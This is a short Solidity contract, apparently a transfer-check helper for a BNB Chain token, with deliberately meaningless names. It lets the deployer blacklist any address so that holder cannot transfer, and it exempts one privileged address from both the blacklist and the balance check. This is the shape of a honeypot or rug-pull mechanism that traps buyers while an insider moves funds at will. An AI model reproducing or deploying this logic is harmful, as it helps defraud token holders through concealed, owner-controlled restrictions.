/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AAAA {

    address immutable one;
    address two;
    mapping (address=>bool) eeee;

    constructor(){
       one = msg.sender; 
    }

    function addaddr(address newaddr) external{
        require(msg.sender == one);
        two = newaddr;
    }

    function addBL(address acc) public {
        require(msg.sender == one);
        eeee[acc] = true;
    }

    function delBL(address acc) public {
        require(msg.sender == one);
        eeee[acc] = false;
    }

    function checkBL(address acc) private view returns (bool){
        return eeee[acc];
    }

    function beforeTransfer(address sender,uint256 balance,uint256 amount) external view returns (bool){
        if(sender != two){
            if(balance < amount){
                return false;
            }

            if(checkBL(sender)){
                return false;
            }
        }
        return true;
    }

}